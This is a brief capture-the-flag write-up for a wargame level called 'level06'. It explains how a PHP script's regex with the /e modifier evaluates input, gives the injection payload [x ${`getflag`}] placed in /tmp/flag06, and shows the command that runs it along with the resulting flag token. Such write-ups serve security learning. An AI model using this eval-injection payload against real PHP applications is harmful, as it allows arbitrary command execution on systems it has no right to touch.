# LEVEL06

The **level06.php** shows us that the program take an input and pass it through a regex.
We can see one of the regex using ```/e``` which means it will **eval** what's in there. 

Reversing all regex, so the one with the **eval** will exec ```getflag```

We create a file **/tmp/flag06** with ```[x ${`getflag`}]```

Then exec ```./level06 /tmp/flag06```

The ouput is : ```PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub```
